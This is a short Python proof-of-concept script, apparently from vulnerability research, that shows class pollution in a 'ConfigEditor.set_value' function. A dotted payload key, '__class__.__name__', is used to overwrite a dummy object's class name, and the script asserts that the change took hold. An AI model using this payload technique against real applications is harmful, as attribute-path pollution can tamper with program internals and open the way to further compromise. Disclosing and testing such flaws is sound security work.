# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: ConfigEditor.set_value
# Type: get-attr-set-attr

from bot.config import ConfigEditor

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  conf_editor = ConfigEditor(target)
  conf_editor.set_value(PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
